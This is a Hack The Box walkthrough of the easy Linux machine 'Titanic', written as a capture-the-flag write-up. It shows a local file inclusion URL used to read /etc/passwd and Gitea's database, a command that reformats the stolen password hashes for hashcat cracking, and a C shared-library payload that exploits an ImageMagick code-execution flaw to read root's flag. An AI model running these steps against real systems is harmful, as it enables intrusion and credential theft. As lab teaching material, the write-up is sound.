---
title: Titanic - HTB
date: 2025-03-13 00:14:21 +0530
categories: [HTB, Linux]
tags: [htb,linux,easy]
---

## Overview
Titanic is an easy machine from Hack The Box in the Week 6 of Season 7. This machine focuses on Local File Inclusion, Password Cracking and Privilege Escalation via writable files and an Arbitrary Code Execution vulnerability. 

---
- **IP:** 10.10.11.55
- **OS:** Linux
- **Difficulty:** Easy
- **Link:** [Titanic - Hack The Box](https://app.hackthebox.com/machines/titanic)
- **Tools Used:** nmap, rustscan, ffuf, Burp Suite,DB Browser for SQLite, sqlite3, hashcat

---
## Enumeration
### Port Scan
The Enumeration process begins with Port Scan using RustScan. The command used is as follows - `rustscan --range=1-65535 -a titanic.htb -- -A -sC -sV`
The open ports are:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Titanic - Book Your Ship Trip
|_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
```
The port scan results indicate that the HTTP service running on port 80 is a likely target for gaining an initial foothold.
### Subdomain Enumeration
ffuf is run to look for subdomains that are being hosted on the same IP using the command `ffuf -c -u http://10.10.11.55 -w /usr/share/wordlists/amass/all.txt -H "Host: FUZZ.titanic.htb" -ac`
**Note:** Please change the machine IP according to your environment.
```
dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 155ms]
```
The domain *dev.titanic.htb* is added to the **/etc/hosts** file along with the IP.
### Website
#### titanic.htb
The website opens to a ship-themed web page with only functionality to book the services. Burp Suite is opened as proxy and all the traffic for the target is routed through the Burp proxy. 
![Home Page](/assets/images/htb_titanic01.png){: w="700" h="400" }

A form is displayed upon clicking the "Book Now" button or the "Book Your Trip" button.
![Booking Form](/assets/images/htb_titanic02.png){: w="700" h="400" }

This form is filled with data and submitted to the server, which downloads a JSON file with the details of the booking.
In Burp Suite, it was observed that the POST request triggered by the form submission redirects to an endpoint called */download* . This endpoint accepts a single parameter named *ticket*, which takes the name of the previously downloaded JSON file as its value.

![Booking Request](/assets/images/htb_titanic03.png){: w="700" h="400" }

![Download Request](/assets/images/htb_titanic04.png){: w="700" h="400" }

#### dev.titanic.htb
The subdomain dev.titanic.htb hosts Gitea, an open-source Git repository management platform. It contains two repositories, **docker-config** and **flask-app**, and two visible user accounts: *administrator* and *developer*. The repositories can be seen by clicking on the "Explore" button on the Top-Left corner.
![Gitea Repositories](/assets/images/htb_titanic05.png){: w="700" h="400" }

![Gitea Users](/assets/images/htb_titanic06.png){: w="700" h="400" }

These Repositories can be cloned using the commands:
 - `git clone http://dev.titanic.htb/developer/docker-config.git`
 - `git clone http://dev.titanic.htb/developer/flask-app.git`

Two **docker-compose.yml** files are observed in the **docker-config** repository.
The [**docker-compose.yml**](http://dev.titanic.htb/developer/docker-config/src/branch/main/gitea/docker-compose.yml) in the **gitea** shows the path on the host machine where Gitea's persistent data will be stored. It also has information that the user running this service has the id of 1000.
![Gitea Docker Compose](/assets/images/htb_titanic07.png){: w="500" h="250" }

The [**docker-compose.yml**](http://dev.titanic.htb/developer/docker-config/src/branch/main/mysql/docker-compose.yml) in the **mysql** directory contains the credential for the mysql service.
![MySQL Docker Compose](/assets/images/htb_titanic08.png){: w="350" h="200" }

---
## Exploitation
### User Flag
A Local File Inclusion vulnerability is discovered in the http://titanic.htb/download endpoint that would download any file given as the parameter value for the *ticket* parameter. The file should have at least read permissions for the user running the service for the file to be downloaded.
The **/etc/passwd** file is downloaded by visiting [http://titanic.htb/download?ticket=/etc/passwd](http://titanic.htb/download?ticket=/etc/passwd)
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
A user account named *developer* is present on the machine, which is running the Gitea service and potentially owns the user flag.

The **gitea.db** file is the SQLite database file used by Gitea when SQLite is configured as the database backend. The path where Gitea's data is stored on the host machine was present in the *docker-compse.yml* file. By referencing that information along with documentation and [installation](https://www.digitalocean.com/community/tutorials/how-to-store-gitea-repositories-on-a-separate-volume#setting-up-a-new-installation-of-gitea) details, it is revealed that the **gitea.db** file is located at **/home/developer/gitea/data/gitea/gitea.db**.

This file is downloaded by visiting [http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db](http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db).

This file is opened and browsed using DB Browser for SQLite . This database has stores credentials of the users in a table named "*user*". 
![Gitea DB User Table](/assets/images/htb_titanic09.png){: w="700" h="400" }

It is observed that *pbkdf2$50000$50* is the hashing algorithm used, where:
- **pbkdf2**: The hashing algorithm used is PBKDF2.
- **50000**: The number of iterations applied during hashing.
- **50**: The length of the hash output in bytes.

The forum post at [PBKDF2-SHA256 Signature unmatched error](https://hashcat.net/forum/thread-7854.html) and the [Hashcat's Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) are referenced to understand that the expected hash format for Hashcat is **sha256:iterations:base64(salt bytes):base64(hash bytes)**.
The following command is run to convert the available hashes to the proper format and store them in a file name **gitea.hash** -
`sqlite3 gitea.db "select passwd,salt from user"| while read data; do password=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); echo "sha256:50000:${salt}:${password}"; done >> gitea.hash`
The **gitea.hash** file is used to crack the passwords with the help of Hashcat -
`hashcat -m 10900 -a 0 gitea.hash /usr/share/wordlists/rockyou.txt`, which gives the password for the user *developer*
This is used to logon to ssh and obtain the user flag.
#### Bonus
The user flag can also be obtained by exploiting the Local File Inclusion vulnerability by visiting http://titanic.htb/download?ticket=/home/developer/user.txt

---
## Privilege Escalation
LinPEAS and `sudo` checks do not reveal any privilege escalation paths, so alternative methods are explored.
A writable directory for the *developer* user is identified using `find / ! -path "$HOME*" ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" ! -path "/run/*" -writable -type d 2>/dev/null` command. This shows two interesting directories - **/opt/app/static/assets/images** and **/opt/app/tickets** .
![Writable Directory](/assets/images/htb_titanic10.png){: w="700" h="400" }

Further analysis is conducted to check if these directory paths appear in any scripts: 
 - `find / -type f ! -path "$HOME/*" ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" -exec grep -l "/opt/app/tickets" {} + 2>/dev/null`
 - `find / -type f ! -path "$HOME/*" ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" -exec grep -l "/opt/app/static/assets/images" {} + 2>/dev/null`

This reveals a bash script named **identify_images.sh** is referencing **/opt/app/static/assets/images** directory.
![Script with Directory](/assets/images/htb_titanic11.png){: w="700" h="400" }

The permissions for **identify_images.sh** script is checked using `ls -lah /opt/scripts/identify_images.sh` and it is observed that anyone can read and execute this script. Upon checking the content of this script, it shows that the script takes all the files with **.jpg** extension from **/opt/app/static/assets/images** and runs [magick identify](https://imagemagick.org/script/identify.php) on each of them, and stores the output to the file **metadata.log**
It is discovered that ImageMagick version 7.1.1-35 is the available binary on the target.
![ImageMagick Version](/assets/images/htb_titanic12.png){: w="700" h="400" }

Searching "ImageMagick 7.1.1-35 vulnerability" on Google leads to [Arbitrary Code Execution in `AppImage` version `ImageMagick`](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8), which is used to retrieve the root flag.
A shared library which will read the contents of the root flag and write it to a file in **/tmp** directory is created in the **/opt/app/static/assets/images** directory. The following command is run to achieve this.
```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/galf.txt");
    exit(0);
}
EOF
```
The root flag is then by accessed by `cat /tmp/galf.txt` .

---
## References
- [Gitea DB Location](https://www.digitalocean.com/community/tutorials/how-to-store-gitea-repositories-on-a-separate-volume#setting-up-a-new-installation-of-gitea)
- [PBKDF2-SHA256 Signature unmatched error](https://hashcat.net/forum/thread-7854.html)
- [Hashcat's Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [magick identify](https://imagemagick.org/script/identify.php)
- [Arbitrary Code Execution in AppImage version ImageMagick](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

---